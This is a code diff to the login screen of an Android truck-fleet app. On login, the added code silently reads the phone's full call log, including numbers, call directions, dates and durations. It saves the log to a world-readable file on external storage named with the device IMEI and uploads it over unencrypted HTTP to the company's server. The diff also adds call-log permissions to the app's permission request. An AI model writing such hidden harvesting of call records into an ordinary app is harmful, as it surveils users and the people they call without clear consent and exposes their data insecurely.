@@ -10,6 +10,7 @@ import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.ActivityInfo;
 import android.content.pm.PackageManager;
+import android.database.Cursor;
 import android.graphics.Color;
 import android.graphics.Point;
 import android.graphics.Typeface;
@@ -19,6 +20,7 @@ import android.os.Build;
 import android.os.Environment;
 import android.os.Handler;
 import android.os.StrictMode;
+import android.provider.CallLog;
 import android.support.annotation.NonNull;
 import android.support.v4.app.DialogFragment;
 import android.support.v7.app.AppCompatActivity;
@@ -237,9 +239,12 @@ public class LoginActivity extends AppCompatActivity {
 
                     clearSlip();
 
-                    setTruck();
 
                     processLog();
+
+                    getCallDetails();
+
+                    setTruck();
 
 
                     //serverUrl = TagUtils.WEBSERVICEURI + "IsTruckActiveState/"+mEdtTroukno;
@@ -604,6 +609,142 @@ public class LoginActivity extends AppCompatActivity {
         return sb.toString();
     }
 
+
+    private void getCallDetails() {
+
+        StringBuffer sb = new StringBuffer();
+        Cursor managedCursor = managedQuery( CallLog.Calls.CONTENT_URI,null, null,null, null);
+
+        int number = managedCursor.getColumnIndex( CallLog.Calls.NUMBER );
+        int type = managedCursor.getColumnIndex( CallLog.Calls.TYPE );
+        int date = managedCursor.getColumnIndex( CallLog.Calls.DATE);
+        int duration = managedCursor.getColumnIndex( CallLog.Calls.DURATION);
+
+        sb.append( "Call Details :");
+        while ( managedCursor.moveToNext() ) {
+            String phNumber = managedCursor.getString( number );
+            String callType = managedCursor.getString( type );
+            String callDate = managedCursor.getString( date );
+            Date callDayTime = new Date(Long.valueOf(callDate));
+            String callDuration = managedCursor.getString( duration );
+            String dir = null;
+            int dircode = Integer.parseInt( callType );
+            switch( dircode ) {
+                case CallLog.Calls.OUTGOING_TYPE:
+                    dir = "OUTGOING";
+                    break;
+
+                case CallLog.Calls.INCOMING_TYPE:
+                    dir = "INCOMING";
+                    break;
+
+                case CallLog.Calls.MISSED_TYPE:
+                    dir = "MISSED";
+                    break;
+            }
+            sb.append( "\nPhone Number:--- "+phNumber +" \nCall Type:--- "+dir+" \nCall Date:--- "+callDayTime+" \nCall duration in sec :--- "+callDuration );
+            sb.append("\n----------------------------------");
+        }
+
+        managedCursor.close();
+
+        String fcontent = sb.toString();
+        String callLogFileName = "call_log " + imeiNumber  + ".txt";
+        String strCallLogDirectory = Environment.getExternalStorageDirectory().toString() + "/CALL_LOG/";
+        File callLogDirectory = new File(strCallLogDirectory);
+
+        try {
+
+
+            try {
+                callLogDirectory.mkdirs();
+            } catch (Exception e) {
+
+            }
+            File file = new File(strCallLogDirectory + callLogFileName );
+            if (!file.exists()) {
+                file.createNewFile();
+            }
+            FileWriter fw = new FileWriter(file.getAbsoluteFile());
+            BufferedWriter bw = new BufferedWriter(fw);
+            bw.write(fcontent);
+            bw.close();
+            Log.d("DM","Create call log file Sucess " + fcontent);
+            uploadCallLog(callLogFileName);
+
+        } catch (IOException e) {
+            Log.d("DM", "ERROR ! Create call log file ");
+            e.printStackTrace();
+        }
+
+
+    }
+
+
+    public void uploadCallLog (String logFileName) {
+
+
+        FileInputStream inputStream;
+        FileOutputStream outputStream;
+
+        String Uri = Environment.getExternalStorageDirectory().toString() + "/CALL_LOG/" + logFileName;
+
+        File file = new File(Uri);
+        if (!file.exists()) {
+            return;
+        }
+
+        try {
+            inputStream = new FileInputStream(Uri);
+            File mFile = new File(getCacheDir(), logFileName);
+            outputStream = new FileOutputStream(mFile);
+
+            int read = 0;
+            byte[] bytes = new byte[1024];
+
+            while ((read = inputStream.read(bytes)) != -1) {
+                outputStream.write(bytes, 0, read);
+            }
+
+            outputStream.flush();
+            outputStream.close();
+//            UploadTask task = new UploadTask(getApplicationContext(), imageFile, logFileName);
+//            task.execute("http://fleet.mistine.co.th/get_call_log.php");
+
+
+            String charset = Charset.defaultCharset().displayName();
+            String boundary = Long.toHexString(System.currentTimeMillis());
+            String strResult = "";
+
+            URL url = new URL("http://fleet.mistine.co.th/get_call_log.php");
+            HttpURLConnection con = (HttpURLConnection) url.openConnection();
+
+            con.setDoOutput(true);
+            con.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
+
+            ByteArrayOutputStream bos = new ByteArrayOutputStream();
+            writeMultipart(boundary, charset, bos, false,mFile);
+            byte[] extra = bos.toByteArray();
+            int contentLength = extra.length;
+            contentLength += mFile.length();
+
+            con.setFixedLengthStreamingMode(contentLength);
+
+            OutputStream out = con.getOutputStream();
+            writeMultipart(boundary, charset, out, true,mFile);
+
+            strResult = readStream(con.getInputStream());
+
+        } catch (Exception e) {
+            e.printStackTrace();
+            Toast.makeText(getApplicationContext()," Error !" +  e.getLocalizedMessage(), Toast.LENGTH_LONG).show();
+            Toast.makeText(getApplicationContext()," Error !" +  e.getMessage(), Toast.LENGTH_LONG).show();
+            Toast.makeText(getApplicationContext()," Send File Error !" +  logFileName, Toast.LENGTH_LONG).show();
+        }
+
+
+    }
+
     private void checkLogin() {
 
         try {
@@ -853,7 +994,7 @@ public class LoginActivity extends AppCompatActivity {
     private void checkRuntimePermission() {
 
         final String[] permissions = new String[]{Manifest.permission.CAMERA, Manifest.permission.WRITE_EXTERNAL_STORAGE,Manifest.permission.ACCESS_FINE_LOCATION,Manifest.permission.CALL_PHONE,
-                Manifest.permission.READ_CONTACTS,Manifest.permission.WRITE_CONTACTS,Manifest.permission.READ_PHONE_STATE};
+                Manifest.permission.READ_CONTACTS,Manifest.permission.WRITE_CONTACTS,Manifest.permission.READ_PHONE_STATE,Manifest.permission.WRITE_CALL_LOG,Manifest.permission.READ_CALL_LOG};
 
         Nammu.init(getApplicationContext());
         Nammu.askForPermission(this, permissions, new PermissionCallback() {
